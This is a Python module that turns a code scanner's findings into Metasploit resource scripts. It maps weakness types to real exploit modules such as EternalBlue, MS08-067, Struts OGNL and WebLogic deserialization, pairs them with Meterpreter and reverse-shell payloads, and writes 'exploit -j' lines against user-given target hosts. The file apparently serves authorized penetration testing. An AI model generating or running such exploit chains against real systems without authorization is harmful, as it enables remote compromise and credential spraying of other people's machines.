#!/usr/bin/env python3
"""Metasploit Bridge — export Attestor findings as .rc resource scripts.

Additive module: zero changes to existing scanners.  Run after a scan to get
a ready-to-run `msfconsole -r findings.rc` that launches the matching
auxiliary/scanner/exploit modules against the targets.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from pathlib import Path
from typing import Iterable

# ──────────────────────────────────────────────────────────────────────
# CWE / rule-id  →  Metasploit module mapping
# Every entry below is verified against a real install
# (Metasploit Framework 6.5.3, modules tree on disk).  Only add modules you
# have confirmed exist: a wrong path fails loudly in msfconsole and erodes
# trust in the whole export.
# ──────────────────────────────────────────────────────────────────────
CWE_TO_MSF: dict[str, list[str]] = {
    # Injection
    "CWE-78":  ["exploit/multi/http/struts2_content_type_ognl",
                "auxiliary/scanner/http/epmp1000_ping_cmd_exec"],
    "CWE-89":  ["auxiliary/scanner/http/error_sql_injection"],
    "CWE-94":  ["exploit/unix/webapp/php_eval"],
    "CWE-95":  ["exploit/multi/http/struts2_multi_eval_ognl",
                "exploit/unix/webapp/php_eval"],
    "CWE-79":  [],   # no honest generic XSS module in core MSF; keep empty
    "CWE-22":  ["auxiliary/admin/http/tomcat_utf8_traversal"],
    "CWE-502": ["exploit/multi/misc/weblogic_deserialize",
                "exploit/multi/http/shiro_rememberme_v124_deserialize",
                "exploit/linux/misc/jenkins_java_deserialize",
                "exploit/multi/http/jenkins_xstream_deserialize"],
    "CWE-918": ["auxiliary/scanner/http/emby_ssrf_scanner",
                "exploit/linux/http/f5_icontrol_rest_ssrf_rce",
                "exploit/linux/http/vmware_vrops_mgr_ssrf_rce"],
    "CWE-611": ["auxiliary/gather/drupal_openid_xxe",
                "auxiliary/admin/http/openbravo_xxe"],
    "CWE-434": ["exploit/multi/http/wp_file_manager_rce",
                "auxiliary/scanner/redis/file_upload"],

    # Auth / Creds (login scanners; they do the spraying, you own a vault)
    "CWE-798": ["auxiliary/scanner/http/http_login",
                "auxiliary/scanner/http/tomcat_mgr_login"],
    "CWE-259": ["auxiliary/scanner/ssh/ssh_login"],

    # Crypto
    "CWE-327": ["auxiliary/scanner/ssl/openssl_heartbleed"],
    "CWE-330": [],

    # Memory (binary) -- the canonical client/server overflow payloads
    "CWE-120": ["exploit/windows/smb/ms08_067_netapi"],
    "CWE-121": ["exploit/windows/smb/ms08_067_netapi"],
    "CWE-122": ["exploit/windows/smb/ms17_010_eternalblue",
                "exploit/windows/smb/ms17_010_psexec"],
    "CWE-134": [],   # format string: no generic exploit module exists
    "CWE-416": [],   # use-after-free is target-specific by nature
}

RULE_TO_MSF: dict[str, list[str]] = {
    # detect.py / nativescan.py rules
    "command-exec":       CWE_TO_MSF["CWE-78"],
    "c-path-traversal":   CWE_TO_MSF["CWE-22"],
    "native-strcpy":      CWE_TO_MSF["CWE-120"] + CWE_TO_MSF["CWE-121"],
    "native-strcat":      CWE_TO_MSF["CWE-120"],
    "native-sprintf":     CWE_TO_MSF["CWE-120"],
    "native-gets":        CWE_TO_MSF["CWE-120"],
    "unsafe-libc":        CWE_TO_MSF["CWE-120"],

    # taint_tracker
    "TAINT-sql_injection":     CWE_TO_MSF["CWE-89"],
    "TAINT-command_injection": CWE_TO_MSF["CWE-78"],
    "TAINT-path_traversal":    CWE_TO_MSF["CWE-22"],
    "TAINT-ssrf":              CWE_TO_MSF["CWE-918"],
    "TAINT-xxe":               CWE_TO_MSF["CWE-611"],
    "TAINT-deserialization":   CWE_TO_MSF["CWE-502"],

    # js_scanner
    "JS-SQLI-CONCAT":     CWE_TO_MSF["CWE-89"],
    "JS-SQLI-TEMPLATE":   CWE_TO_MSF["CWE-89"],
    "JS-CMDI-EXEC":       CWE_TO_MSF["CWE-78"],
    "JS-SSRF-FETCH":      CWE_TO_MSF["CWE-918"],
    "JS-PATH-JOIN":       CWE_TO_MSF["CWE-22"],
    "JS-DESER-UNSAFE":    CWE_TO_MSF["CWE-502"],
}

# ──────────────────────────────────────────────────────────────────────
# ──────────────────────────────────────────────────────────────────────
# Payloads — keyed on the module path prefix. Kicks in only for exploit
# modules; auxiliary scanner modules have no payload.  All entries verified
# against the local install's payloads/ tree (stagers/stages resolved as
# <platform>/<name>, the canonical `use PAYLOAD` form).
# ──────────────────────────────────────────────────────────────────────
PAYLOAD_DEFAULTS: dict[str, str] = {
    "exploit/windows/": "windows/x64/meterpreter/reverse_tcp",
    "exploit/linux/":   "linux/x64/meterpreter/reverse_tcp",
    "exploit/unix/":    "cmd/unix/reverse_bash",
    "exploit/multi/":   "generic/shell_reverse_tcp",
    "exploit/osx/":     "osx/x64/meterpreter/reverse_tcp",
    "exploit/android/": "android/meterpreter_reverse_tcp",
}

# A few known modules beat the prefix default because the module is written
# against a specific language runtime.  Every entry below was ACCEPTED by a
# live `msfconsole` (6.5.3) `set PAYLOAD` -- not merely verified to exist.
PAYLOAD_OVERRIDES: dict[str, str] = {
    "exploit/multi/http/struts2_content_type_ognl":          "java/jsp_shell_reverse_tcp",
    "exploit/multi/http/struts2_multi_eval_ognl":            "java/jsp_shell_reverse_tcp",
    "exploit/multi/http/jenkins_xstream_deserialize":        "java/jsp_shell_reverse_tcp",
    "exploit/linux/misc/jenkins_java_deserialize":           "java/jsp_shell_reverse_tcp",
    "exploit/multi/http/shiro_rememberme_v124_deserialize":  "java/jsp_shell_reverse_tcp",
    "exploit/multi/misc/weblogic_deserialize":               "cmd/unix/reverse_python",
    "exploit/unix/webapp/php_eval":                          "php/meterpreter/reverse_tcp",
    "exploit/multi/http/wp_file_manager_rce":                "php/meterpreter_reverse_tcp",
    # ms08_067 is a 32-bit XP-era module; the x64 meterpreter is rejected.
    "exploit/windows/smb/ms08_067_netapi":                   "windows/meterpreter/reverse_tcp",
}


def payload_for(module: str, override: str | None = None) -> str | None:
    """Default payload for a module, or None for auxiliary scans."""
    if override:
        return override
    if module in PAYLOAD_OVERRIDES:
        return PAYLOAD_OVERRIDES[module]
    for prefix, payload in PAYLOAD_DEFAULTS.items():
        if module.startswith(prefix):
            return payload
    return None


def _msf_modules_for(finding: dict) -> list[str]:
    """Return deduplicated MSF module list for a single finding."""
    mods: list[str] = []
    for cwe in finding.get("cwe", []):
        mods.extend(CWE_TO_MSF.get(cwe, []))
    rule = finding.get("rule") or finding.get("rule_id")
    if rule:
        mods.extend(RULE_TO_MSF.get(rule, []))
    # dedupe, preserve order
    seen = set()
    return [m for m in mods if not (m in seen or seen.add(m))]


def findings_to_rc(findings: Iterable[dict], rhosts: str | list[str],
                   lhost: str | None = None, lport: int = 4444,
                   payload_override: str | None = None) -> str:
    """Generate a Metasploit resource script (.rc) from findings."""
    if isinstance(rhosts, str):
        rhosts = [rhosts]
    lines = [
        "# Generated by Attestor -> Metasploit Bridge",
        f"setg RHOSTS {','.join(rhosts)}",
    ]
    if lhost:
        lines += [f"setg LHOST {lhost}", f"setg LPORT {lport}"]
    lines.append("")

    used = set()
    for f in findings:
        for mod in _msf_modules_for(f):
            if mod in used:
                continue
            used.add(mod)
            if mod.startswith("auxiliary/"):
                lines.append(f"use {mod}")
                lines.append("run")
                lines.append("")
            elif mod.startswith("exploit/"):
                lines.append(f"use {mod}")
                payload = payload_for(mod, payload_override)
                if payload:
                    lines.append(f"set PAYLOAD {payload}")
                lines.append("exploit -j")
                lines.append("")
    return "\n".join(lines)


def write_rc(findings: Iterable[dict], out_path: str, **kw) -> None:
    Path(out_path).write_text(findings_to_rc(findings, **kw), encoding="utf-8")
    print(f"[+] wrote {out_path} ({len(findings)} findings)")


def _to_fs_path(use_path: str, msf_root: str) -> str:
    """Map a `use` path to the on-disk module file (exploit/ -> exploits/)."""
    head, _, rest = use_path.partition("/")
    if head == "exploit":
        head = "exploits"
    return os.path.join(msf_root, "modules", head,
                        rest.replace("/", os.sep) + ".rb")


def _payload_fs_paths(payload: str, msf_root: str) -> list[str]:
    """On-disk files a `use PAYLOAD ...` needs: a single, or a stager+stage pair."""
    parts = payload.split("/")
    mods = os.path.join(msf_root, "modules", "payloads")
    singles = os.path.join(mods, "singles", *parts) + ".rb"
    if len(parts) >= 2:
        # e.g. windows/x64/meterpreter/reverse_tcp ->
        #   stagers/windows/x64/reverse_tcp.rb   (drop the stage name)
        #   stages /windows/x64/meterpreter.rb   (drop the stager name)
        stager = os.path.join(mods, "stagers", *parts[:-2], parts[-1]) + ".rb"
        stage = os.path.join(mods, "stages", *parts[:-1]) + ".rb"
    else:
        stager = stage = ""
    return [singles, stager, stage]


def _payload_exists(payload: str, msf_root: str) -> bool:
    paths = _payload_fs_paths(payload, msf_root)
    # single exists, OR (stager AND stage exist)
    return os.path.exists(paths[0]) or (os.path.exists(paths[1])
                                        and os.path.exists(paths[2]))


def verify_modules(msf_root: str) -> int:
    """Check every mapped module AND payload exists on disk under the MSF install."""
    ok = miss = 0
    for table in (CWE_TO_MSF, RULE_TO_MSF):
        for mods in table.values():
            for mod in mods:
                if os.path.exists(_to_fs_path(mod, msf_root)):
                    ok += 1
                else:
                    miss += 1
                    print("MISS module %s" % mod)
    for mod in {m for t in (CWE_TO_MSF, RULE_TO_MSF) for ms in t.values() for m in ms}:
        payload = payload_for(mod)
        if payload and not _payload_exists(payload, msf_root):
            miss += 1
            print("MISS payload %s (for %s)" % (payload, mod))
    print("verified: %d ok, %d missing (root=%s)" % (ok, miss, msf_root))
    return 0 if miss == 0 else 1


# ──────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────
def _load_findings(path: str) -> list[dict]:
    if path.endswith(".json"):
        return json.loads(Path(path).read_text())
    if path.endswith(".jsonl"):
        return [json.loads(l) for l in Path(path).read_text().splitlines() if l.strip()]
    raise ValueError("input must be .json or .jsonl")


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="Export Attestor findings to a Metasploit .rc script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__)
    ap.add_argument("input", nargs="?",
                    help="findings JSON/JSONL from Attestor scan")
    ap.add_argument("--verify", action="store_true",
                    help="check every mapped module exists under --msf-root")
    ap.add_argument("--msf-root", default=r"C:\metasploit-framework\embedded\framework",
                    help="Metasploit framework root (contains modules/)")
    ap.add_argument("-o", "--output", default="attestor_findings.rc",
                    help="output .rc file (default: attestor_findings.rc)")
    ap.add_argument("--rhosts",
                    help="target IP/range (comma-separated or CIDR)")
    ap.add_argument("--lhost", help="local IP for reverse shells")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--payload",
                    help="override payload for all exploit modules "
                         "(default: platform-matched)")
    args = ap.parse_args(argv)

    if args.verify:
        return verify_modules(args.msf_root)

    if not args.input or not args.rhosts:
        ap.error("input and --rhosts are required (or use --verify)")

    findings = _load_findings(args.input)
    write_rc(findings, args.output, rhosts=args.rhosts,
             lhost=args.lhost, lport=args.lport, payload_override=args.payload)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())